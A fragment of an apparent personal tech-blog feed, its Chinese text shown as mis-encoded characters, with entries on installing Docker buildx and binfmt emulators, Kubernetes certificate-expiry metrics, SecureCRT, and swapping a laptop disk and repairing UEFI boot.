class="hljs-literal">false</span>     <br></code></pre></td></tr></table></figure><h2 id="å°è¯•3ï¼šä¿®æ”¹-x2F-etc-x2F-docker-x2F-daemon-json-â€“-gt-ExperimentalæˆåŠŸå¼€å¯"><a href="#å°è¯•3ï¼šä¿®æ”¹-x2F-etc-x2F-docker-x2F-daemon-json-â€“-gt-ExperimentalæˆåŠŸå¼€å¯" class="headerlink" title="å°è¯•3ï¼šä¿®æ”¹&#x2F;etc&#x2F;docker&#x2F;daemon.json   â€“&gt; ExperimentalæˆåŠŸå¼€å¯"></a>å°è¯•3ï¼šä¿®æ”¹&#x2F;etc&#x2F;docker&#x2F;daemon.json   â€“&gt; ExperimentalæˆåŠŸå¼€å¯</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan .docker]<span class="hljs-comment"># vi /etc/docker/daemon.json</span><br>&#123;<br>  <span class="hljs-string">&quot;experimental&quot;</span>: <span class="hljs-literal">true</span>,<br>  ...<br>&#125;<br>[root@ningan .docker]<span class="hljs-comment"># systemctl restart docker</span><br>[root@ningan .docker]<span class="hljs-comment"># docker info |grep Experimental</span><br>WARNING: No swap <span class="hljs-built_in">limit</span> support<br> Experimental: <span class="hljs-literal">true</span><br>[root@ningan ~]<span class="hljs-comment"># docker version</span><br>Client:<br> Version:           20.10.21<br> API version:       1.41<br> Go version:        go1.18.1<br> Git commit:        20.10.21-0ubuntu1~18.04.3<br> Built:             Thu Apr 27 05:50:21 2023<br> OS/Arch:           linux/amd64<br> Context:           default<br> Experimental:      <span class="hljs-literal">true</span><br><br>Server:<br> Engine:<br>  Version:          20.10.21<br>  API version:      1.41 (minimum version 1.12)<br>  Go version:       go1.18.1<br>  Git commit:       20.10.21-0ubuntu1~18.04.3<br>  Built:            Thu Apr 27 05:36:22 2023<br>  OS/Arch:          linux/amd64<br>  Experimental:     <span class="hljs-literal">true</span>                      <span class="hljs-comment">###########################  è¿™ä¸ªåœ°æ–¹å˜æˆtrueäº†</span><br> containerd:<br>  Version:          v1.6.2<br>  GitCommit:        de8046a5501db9e0e478e1c10cbcfb21af4c6b2d<br> runc:<br>  Version:          1.1.1<br>  GitCommit:        v1.1.0-20-g52de29d7<br> docker-init:<br>  Version:          0.19.0<br>  GitCommit:  <br>[root@ningan ~]<span class="hljs-comment"># docker buildx version</span><br>docker: <span class="hljs-string">&#x27;buildx&#x27;</span> is not a docker <span class="hljs-built_in">command</span>.<br>See <span class="hljs-string">&#x27;docker --help      </span><br></code></pre></td></tr></table></figure><h2 id="å°è¯•4ï¼šå¼€å¯binfmt"><a href="#å°è¯•4ï¼šå¼€å¯binfmt" class="headerlink" title="å°è¯•4ï¼šå¼€å¯binfmt"></a>å°è¯•4ï¼šå¼€å¯binfmt</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># docker run --rm --privileged tonistiigi/binfmt:latest --install all</span><br>Unable to find image <span class="hljs-string">&#x27;tonistiigi/binfmt:latest&#x27;</span> locally<br>latest: Pulling from tonistiigi/binfmt<br>8d4d64c318a5: Pull complete <br>e9c608ddc3cb: Pull complete <br>Digest: sha256:66e11bea77a5ea9d6f0fe79b57cd2b189b5d15b93a2bdb925be22949232e4e55<br>Status: Downloaded newer image <span class="hljs-keyword">for</span> tonistiigi/binfmt:latest<br>installing: riscv64 OK<br>installing: mips64le OK<br>installing: ppc64le OK<br>installing: mips64 OK<br>installing: arm64 OK<br>installing: arm OK<br>installing: s390x OK<br>&#123;<br>  <span class="hljs-string">&quot;supported&quot;</span>: [<br>    <span class="hljs-string">&quot;linux/amd64&quot;</span>,<br>    <span class="hljs-string">&quot;linux/arm64&quot;</span>,<br>    <span class="hljs-string">&quot;linux/riscv64&quot;</span>,<br>    <span class="hljs-string">&quot;linux/ppc64le&quot;</span>,<br>    <span class="hljs-string">&quot;linux/s390x&quot;</span>,<br>    <span class="hljs-string">&quot;linux/386&quot;</span>,<br>    <span class="hljs-string">&quot;linux/mips64le&quot;</span>,<br>    <span class="hljs-string">&quot;linux/mips64&quot;</span>,<br>    <span class="hljs-string">&quot;linux/arm/v7&quot;</span>,<br>    <span class="hljs-string">&quot;linux/arm/v6&quot;</span><br>  ],<br>  <span class="hljs-string">&quot;emulators&quot;</span>: [<br>    <span class="hljs-string">&quot;jar&quot;</span>,<br>    <span class="hljs-string">&quot;llvm-6.0-runtime.binfmt&quot;</span>,<br>    <span class="hljs-string">&quot;python2.7&quot;</span>,<br>    <span class="hljs-string">&quot;python3.6&quot;</span>,<br>    <span class="hljs-string">&quot;qemu-aarch64&quot;</span>,<br>    <span class="hljs-string">&quot;qemu-arm&quot;</span>,<br>    <span class="hljs-string">&quot;qemu-mips64&quot;</span>,<br>    <span class="hljs-string">&quot;qemu-mips64el&quot;</span>,<br>    <span class="hljs-string">&quot;qemu-ppc64le&quot;</span>,<br>    <span class="hljs-string">&quot;qemu-riscv64&quot;</span>,<br>    <span class="hljs-string">&quot;qemu-s390x&quot;</span><br>  ]<br>&#125;<br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># ls -l /proc/sys/fs/binfmt_misc/</span><br>total 0<br>-rw-r--r-- 1 root root 0 Feb  4 21:40 jar<br>-rw-r--r-- 1 root root 0 Feb  4 21:40 llvm-6.0-runtime.binfmt<br>-rw-r--r-- 1 root root 0 Feb  4 21:40 python2.7<br>-rw-r--r-- 1 root root 0 Feb  4 21:40 python3.6<br>-rw-r--r-- 1 root root 0 Feb 20 11:29 qemu-aarch64<br>-rw-r--r-- 1 root root 0 Feb 20 11:29 qemu-arm<br>-rw-r--r-- 1 root root 0 Feb 20 11:29 qemu-mips64<br>-rw-r--r-- 1 root root 0 Feb 20 11:29 qemu-mips64el<br>-rw-r--r-- 1 root root 0 Feb 20 11:29 qemu-ppc64le<br>-rw-r--r-- 1 root root 0 Feb 20 11:29 qemu-riscv64<br>-rw-r--r-- 1 root root 0 Feb 20 11:29 qemu-s390x<br>--w------- 1 root root 0 Feb  4 21:40 register<br>-rw-r--r-- 1 root root 0 Feb  4 21:40 status<br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># grep -r &quot;enabled&quot; /proc/sys/fs/binfmt_misc/ </span><br>/proc/sys/fs/binfmt_misc/qemu-s390x:enabled<br>/proc/sys/fs/binfmt_misc/qemu-arm:enabled<br>/proc/sys/fs/binfmt_misc/qemu-aarch64:enabled<br>/proc/sys/fs/binfmt_misc/qemu-mips64:enabled<br>/proc/sys/fs/binfmt_misc/qemu-ppc64le:enabled<br>/proc/sys/fs/binfmt_misc/qemu-mips64el:enabled<br>/proc/sys/fs/binfmt_misc/qemu-riscv64:enabled<br>/proc/sys/fs/binfmt_misc/jar:enabled<br>/proc/sys/fs/binfmt_misc/python2.7:enabled<br>/proc/sys/fs/binfmt_misc/llvm-6.0-runtime.binfmt:enabled<br>/proc/sys/fs/binfmt_misc/python3.6:enabled<br>grep: /proc/sys/fs/binfmt_misc/register: Invalid argument<br>/proc/sys/fs/binfmt_misc/status:enabled<br>[root@ningan ~]<span class="hljs-comment"># docker buildx</span><br>docker: <span class="hljs-string">&#x27;buildx&#x27;</span> is not a docker <span class="hljs-built_in">command</span>.<br>See <span class="hljs-string">&#x27;docker --help&#x27;</span><br>[root@ningan ~]<span class="hljs-comment"># </span><br><br><br></code></pre></td></tr></table></figure><h2 id="å°è¯•5ï¼šå®‰è£…docker-buildx-plugin-â€“-gt-docker-buildx-æˆåŠŸ"><a href="#å°è¯•5ï¼šå®‰è£…docker-buildx-plugin-â€“-gt-docker-buildx-æˆåŠŸ" class="headerlink" title="å°è¯•5ï¼šå®‰è£…docker-buildx-plugin â€“&gt; docker buildx æˆåŠŸ"></a>å°è¯•5ï¼šå®‰è£…docker-buildx-plugin â€“&gt; docker buildx æˆåŠŸ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># sudo apt install docker-buildx-plugin</span><br>Reading package lists... Done<br>Building dependency tree       <br>Reading state information... Done<br>E: Unable to locate package docker-buildx-plugin<br>[root@ningan ~]<span class="hljs-comment"># apt update</span><br>Hit:1 https://mirrors.aliyun.com/ubuntu bionic InRelease<br>Hit:2 https://mirrors.aliyun.com/ubuntu bionic-security InRelease             <br>Hit:3 https://mirrors.aliyun.com/ubuntu bionic-updates InRelease              <br>Hit:4 https://mirrors.aliyun.com/ubuntu bionic-backports InRelease              <br>Reading package lists... Done                                                   <br>Building dependency tree       <br>Reading state information... Done<br>5 packages can be upgraded. Run <span class="hljs-string">&#x27;apt list --upgradable&#x27;</span> to see them.<br><br><span class="hljs-comment"># æ·»åŠ  Docker å®˜æ–¹ GPG å¯†é’¥ï¼š</span><br>[root@ningan ~]<span class="hljs-comment"># curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br>OK<br><span class="hljs-comment"># æ·»åŠ  Docker å®˜æ–¹ä»“åº“ï¼š</span><br>[root@ningan ~]<span class="hljs-comment"># sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot;</span><br>Hit:1 https://mirrors.aliyun.com/ubuntu bionic InRelease<br>Hit:2 https://mirrors.aliyun.com/ubuntu bionic-security InRelease              <br>Hit:3 https://mirrors.aliyun.com/ubuntu bionic-updates InRelease                <br>Hit:4 https://mirrors.aliyun.com/ubuntu bionic-backports InRelease              <br>Get:5 https://download.docker.com/linux/ubuntu bionic InRelease [64.4 kB]<br>Get:6 https://download.docker.com/linux/ubuntu bionic/stable amd64 Packages [39.0 kB]<br>Fetched 103 kB <span class="hljs-keyword">in</span> 4s (24.2 kB/s)    <br>Reading package lists... Done<br><br><span class="hljs-comment"># æ›´æ–°è½¯ä»¶æºåˆ—è¡¨å¹¶å®‰è£…Â `docker-buildx-plugin`</span><br>[root@ningan ~]<span class="hljs-comment"># sudo apt update  </span><br>Hit:1 https://mirrors.aliyun.com/ubuntu bionic InRelease<br>Hit:2 https://mirrors.aliyun.com/ubuntu bionic-security InRelease                                                               <br>Hit:3 https://mirrors.aliyun.com/ubuntu bionic-updates InRelease                                                                 <br>Hit:4 https://download.docker.com/linux/ubuntu bionic InRelease                                                                  <br>Hit:5 https://mirrors.aliyun.com/ubuntu bionic-backports InRelease        <br>Reading package lists... Done                      <br>Building dependency tree       <br>Reading state information... Done<br>5 packages can be upgraded. Run <span class="hljs-string">&#x27;apt list --upgradable&#x27;</span> to see them.<br>[root@ningan ~]<span class="hljs-comment"># sudo apt install docker-buildx-plugin</span><br>Reading package lists... Done<br>Building dependency tree       <br>Reading state information... Done<br>The following packages were automatically installed and are no longer required:<br>  linux-hwe-5.4-headers-5.4.0-126 linux-hwe-5.4-headers-5.4.0-131 linux-hwe-5.4-headers-5.4.0-132 linux-hwe-5.4-headers-5.4.0-135<br>  linux-hwe-5.4-headers-5.4.0-136 linux-hwe-5.4-headers-5.4.0-137 linux-hwe-5.4-headers-5.4.0-139 linux-hwe-5.4-headers-5.4.0-144<br>  linux-hwe-5.4-headers-5.4.0-146 linux-hwe-5.4-headers-5.4.0-147 linux-hwe-5.4-headers-5.4.0-148 pkg-php-tools shtool<br>Use <span class="hljs-string">&#x27;sudo apt autoremove&#x27;</span> to remove them.<br>The following NEW packages will be installed:<br>  docker-buildx-plugin<br>0 upgraded, 1 newly installed, 0 to remove and 5 not upgraded.<br>Need to get 26.1 MB of archives.<br>After this operation, 71.2 MB of additional disk space will be used.<br>Get:1 https://download.docker.com/linux/ubuntu bionic/stable amd64 docker-buildx-plugin amd64 0.10.5-1~ubuntu.18.04~bionic [26.1 MB]<br>Fetched 26.1 MB <span class="hljs-keyword">in</span> 7s (3,669 kB/s)                                                                                                    <br>Selecting previously unselected package docker-buildx-plugin.<br>(Reading database ... 382316 files and directories currently installed.)<br>Preparing to unpack .../docker-buildx-plugin_0.10.5-1~ubuntu.18.04~bionic_amd64.deb ...<br>Unpacking docker-buildx-plugin (0.10.5-1~ubuntu.18.04~bionic) ...<br>Setting up docker-buildx-plugin (0.10.5-1~ubuntu.18.04~bionic) ...<br>[root@ningan ~]<span class="hljs-comment"># docker buildx version</span><br>github.com/docker/buildx v0.10.5 86bdced<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€secureCRTã€‘(202402) windowsä¸‹å®‰è£…secureCRT</title>
    <link href="/2024/02/07/software/%E3%80%90secureCRT%E3%80%91(202402)%20windows%E4%B8%8B%E5%AE%89%E8%A3%85secureCRT/"/>
    <url>/2024/02/07/software/%E3%80%90secureCRT%E3%80%91(202402)%20windows%E4%B8%8B%E5%AE%89%E8%A3%85secureCRT/</url>
    
    <content type="html"><![CDATA[<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://zhuanlan.zhihu.com/p/510914995">https://zhuanlan.zhihu.com/p/510914995</a>   å®‰è£…åŒ…ä¸‹è½½çš„è¿™ä¸ªåœ°æ–¹çš„</p>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
    <tags>
      
      <tag>software</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘(202402) podçš„specå’Œstatusä¸­å®¹å™¨imageä¸ä¸€æ ·</title>
    <link href="/2024/02/06/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202402)%20pod%E7%9A%84spec%E5%92%8Cstatus%E4%B8%AD%E5%AE%B9%E5%99%A8image%E4%B8%8D%E4%B8%80%E6%A0%B7/"/>
    <url>/2024/02/06/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202402)%20pod%E7%9A%84spec%E5%92%8Cstatus%E4%B8%AD%E5%AE%B9%E5%99%A8image%E4%B8%8D%E4%B8%80%E6%A0%B7/</url>
    
    <content type="html"><![CDATA[<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/qq_42303254/article/details/120039678">05-ã€dockerã€‘spec.containers[x].image ä¸ status.containerStatuses[x].imageè¿™ä¸¤ä¸ªå¿…é¡»ä¸€è‡´å—ï¼Ÿ_signed must be an image digest: spec.containers[0]-CSDNåšå®¢</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘è¯ä¹¦apiserver_client_certificate_expiration_seconds</title>
    <link href="/2024/02/06/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202402)%20%E8%AF%81%E4%B9%A6apiserver_client_certificate_expiration_seconds/"/>
    <url>/2024/02/06/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202402)%20%E8%AF%81%E4%B9%A6apiserver_client_certificate_expiration_seconds/</url>
    
    <content type="html"><![CDATA[<h2 id="æ™®ç½—è¡¨è¾¾å¼"><a href="#æ™®ç½—è¡¨è¾¾å¼" class="headerlink" title="æ™®ç½—è¡¨è¾¾å¼"></a>æ™®ç½—è¡¨è¾¾å¼</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">apiserver_client_certificate_expiration_seconds_count&#123;job=<span class="hljs-string">&quot;apiserver&quot;</span>&#125; &gt; 0 and on(job) histogram_quantile(0.01, <span class="hljs-built_in">sum</span> by (job, le) (rate(apiserver_client_certificate_expiration_seconds_bucket&#123;job=<span class="hljs-string">&quot;apiserver&quot;</span>&#125;[5m])))<br><br></code></pre></td></tr></table></figure><h2 id="ç›¸å…³å®˜æ–¹è§£é‡Š"><a href="#ç›¸å…³å®˜æ–¹è§£é‡Š" class="headerlink" title="ç›¸å…³å®˜æ–¹è§£é‡Š"></a>ç›¸å…³å®˜æ–¹è§£é‡Š</h2><p>apiserver_client_certificate_expiration_secondè¯ä¹¦å®šä¹‰çš„ä½ç½®ï¼š<a href="https://github.com/kubernetes/kubernetes/blob/244fbf94fd736e94071a77a8b7c91d81163249d4/staging/src/k8s.io/apiserver/pkg/authentication/request/x509/x509.go#L48">kubernetes&#x2F;staging&#x2F;src&#x2F;k8s.io&#x2F;apiserver&#x2F;pkg&#x2F;authentication&#x2F;request&#x2F;x509&#x2F;x509.go at 244fbf94fd736e94071a77a8b7c91d81163249d4 Â· kubernetes&#x2F;kubernetes (github.com) </a></p><p>apiserver_client_certificate_expiration_secondsè¡¨ç¤ºçš„å«ä¹‰ï¼š<a href="https://github.com/kubernetes/kubernetes/commit/f90bbc3d6bfba992831eb216161990eae1098ae5">src&#x2F;k8s.io&#x2F;apiserver: Increase cert expiration histogram resolution Â· kubernetes&#x2F;kubernetes@f90bbc3 (github.com)</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240206121620.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/%7B64282e77-9fe7-41fc-86eb-f9dc730ed67e%7D.png" alt="{64282e77-9fe7-41fc-86eb-f9dc730ed67e}.png"></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ç¡¬ç›˜ã€‘(202402)çºªå¿µç¬¬ä¸€æ¬¡æ¢ç¬”è®°æœ¬ç¡¬ç›˜</title>
    <link href="/2024/02/04/windows/%E3%80%90%E7%A1%AC%E7%9B%98%E3%80%91(202402)%E7%BA%AA%E5%BF%B5%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8D%A2%E7%AC%94%E8%AE%B0%E6%9C%AC%E7%A1%AC%E7%9B%98/"/>
    <url>/2024/02/04/windows/%E3%80%90%E7%A1%AC%E7%9B%98%E3%80%91(202402)%E7%BA%AA%E5%BF%B5%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8D%A2%E7%AC%94%E8%AE%B0%E6%9C%AC%E7%A1%AC%E7%9B%98/</url>
    
    <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>ç¬”è®°æœ¬çš„ç¡¬ç›˜åªæœ‰500Gï¼Œå¤ªå°äº†ï¼Œæƒ³æ¢ä¸€ä¸ª1Tçš„ç¡¬ç›˜</p><h2 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h2><p>diskGeniusï¼šç¡¬ç›˜æ‹·è´</p><h2 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><h3 id="ç¡¬ç›˜æ‹·è´"><a href="#ç¡¬ç›˜æ‹·è´" class="headerlink" title="ç¡¬ç›˜æ‹·è´"></a>ç¡¬ç›˜æ‹·è´</h3><p>æ‰“å¼€diskGenius<br>é€‰æ‹©â€œå·¥å…·â€-&gt;â€œå…‹éš†ç£ç›˜â€-&gt;<br>é€‰æ‹©â€œæºç£ç›˜â€å’Œâ€œç›®çš„ç£ç›˜â€</p><p>é€‰æ‹©â€œçƒ­æ‹·è´â€ï¼Œæ¼«é•¿çš„ç­‰å¾…~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240204214640.png" alt="image.png"></p><h3 id="æ¢ç¡¬ç›˜"><a href="#æ¢ç¡¬ç›˜" class="headerlink" title="æ¢ç¡¬ç›˜"></a>æ¢ç¡¬ç›˜</h3><p>å°†æ—§çš„ç¡¬ç›˜æ‹†ä¸‹æ¥ï¼Œæ¢ä¸Šæ–°çš„ç¡¬ç›˜</p><h3 id="å¯åŠ¨è®¡ç®—æœº"><a href="#å¯åŠ¨è®¡ç®—æœº" class="headerlink" title="å¯åŠ¨è®¡ç®—æœº"></a>å¯åŠ¨è®¡ç®—æœº</h3><p>å¯åŠ¨è®¡ç®—æœºï¼Œç•Œé¢å¦‚ä¸‹ï¼Œè¿™æ ·å­æ˜¯å› ä¸ºå¼•å¯¼å‡ºç°äº†é—®é¢˜ï¼Œéœ€è¦ä¿®å¤ä¸€ä¸‹å¼•å¯¼</p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/650a9e2fb237624be36d3d7048cc7ed.jpg" style="transform:rotate(270deg);"><h3 id="åˆ¶ä½œpe"><a href="#åˆ¶ä½œpe" class="headerlink" title="åˆ¶ä½œpe"></a>åˆ¶ä½œpe</h3><p>æœç´¢â€œå¾®peå·¥å…·ç®±â€</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240204215537.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240204215643.png" alt="image.png"></p><p>æˆ‘æ²¡æ’uç›˜ï¼Œæ’äº†uç›˜ä¹‹åï¼Œâ€œå¾…å†™å…¥Uç›˜â€çš„åœ°æ–¹ä¼šè¯»åˆ°ä¸œè¥¿ï¼Œç‚¹å‡»å®‰è£…å³å¯~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240204215726.png" alt="image.png"></p><h3 id="ä¿®å¤å¼•å¯¼"><a href="#ä¿®å¤å¼•å¯¼" class="headerlink" title="ä¿®å¤å¼•å¯¼"></a>ä¿®å¤å¼•å¯¼</h3><p>è£…å®Œpeä¹‹åï¼Œå°†uç›˜æ’å…¥ç”µè„‘ï¼Œå¯åŠ¨è®¡ç®—æœºï¼Œç–¯ç‹‚æŒ‰F12ï¼Œè¿›å…¥ç±»ä¼¼ä¸‹é¢çš„ç•Œé¢ï¼Œé€‰æ‹©ä»uç›˜å¯åŠ¨</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/6e2e7885e510da60efe47cd9b1dc69d.jpg" alt="6e2e7885e510da60efe47cd9b1dc69d.jpg"></p><p>ç‚¹å‡»â€œWindowsâ€ï¼Œé€‰æ‹©â€œWindowså¼•å¯¼ä¿®å¤â€</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/fda878982ec474c6abb3052bad13633.jpg" alt="fda878982ec474c6abb3052bad13633.jpg"></p><p>é€‰æ‹©â€œä¿®UEFIå¼•å¯¼â€ï¼Œå¼•å¯¼ç›˜ä¼šè‡ªåŠ¨çš„åˆ‡åˆ°Zç›˜ï¼Œå¯ä»¥çœ‹åˆ°Zç›˜æœ‰EFIå¯åŠ¨æ–‡ä»¶ï¼Œç‚¹å‡»â€œå¼€å§‹ä¿®å¤â€</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/8c691ddfff4e9e95b8b399f08ceff4e.jpg" alt="8c691ddfff4e9e95b8b399f08ceff4e.jpg"></p><p>ä¿®å¤ä¹‹åï¼Œç‚¹å‡»â€œWindowså¼•å¯¼ä¿®å¤â€ä¸‹çš„â€œBCDå¼•å¯¼ç¼–è¾‘â€ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªWindow11ï¼Œæ¯”è¾ƒä¸€ä¸‹å‘ç°ï¼Œä¸‹é¢é‚£ä¸ªâ€œWindows11â€çš„deviceå’Œosdeviceéƒ½æ˜¯unknowsï¼Œè€Œâ€œWindows11ã€é»˜è®¤ã€‘â€éƒ½æ˜¯partition&#x3D;C:<br>(ä¸‹é¢è¿™ä¸ªæˆ‘å·²ç»æ”¹è¿‡äº†)</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/478833ccfb0058690c2bbf7e0e50af9.jpg" alt="478833ccfb0058690c2bbf7e0e50af9.jpg"></p><h3 id="é‡æ–°å¯åŠ¨"><a href="#é‡æ–°å¯åŠ¨" class="headerlink" title="é‡æ–°å¯åŠ¨"></a>é‡æ–°å¯åŠ¨</h3><p>é‡æ–°å¯åŠ¨è®¡ç®—æœºï¼Œæœ‰ä¸¤ä¸ªé€‰é¡¹ï¼Œç¬¬ä¸€ä¸ªå¯ä»¥è¿›å»ï¼Œç¬¬äºŒä¸ªè¿›ä¸å»(å¿˜è®°æˆªå›¾äº†)</p><p>å½“æŠŠä¸Šé¢è¯´åˆ°çš„2ä¸ªunknownæ”¹æˆâ€œpartition&#x3D;C:â€åï¼ŒæŠŠâ€œWindows11ã€é»˜è®¤ã€‘â€åˆ æ‰ä¹‹åï¼Œé‡å¯è®¡ç®—æœºåªå‰©ä¸‹äº†ä¸€ä¸ªé€‰æ‹©ï¼Œå¯ä»¥æ­£å¸¸è¿›å…¥ç³»ç»Ÿ~</p><p>è‡³æ­¤ï¼Œç¡¬ç›˜æ›¿æ¢å®Œæ¯•ï¼Œåˆgetäº†ä¸€é¡¹æ–°æŠ€èƒ½~</p><p>æ…¢æ…¢æ¥ï¼Œæ¯å¤©è¿›æ­¥ä¸€ç‚¹ç‚¹ï¼Œæœªæ¥çš„ä½ ç»ˆç©¶ä¼šæ„Ÿè°¢ç°åœ¨å¥‹æ–—çš„è‡ªå·±~</p>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€obsidianç³»åˆ—ã€‘06.obsidianä¸­å¦‚ä½•ç»Ÿè®¡æ¯ä¸ªæ–‡ä»¶å¤¹ä¸‹æ–‡ä»¶çš„ä¸ªæ•°ï¼ŸFile Explorer Note Count</title>
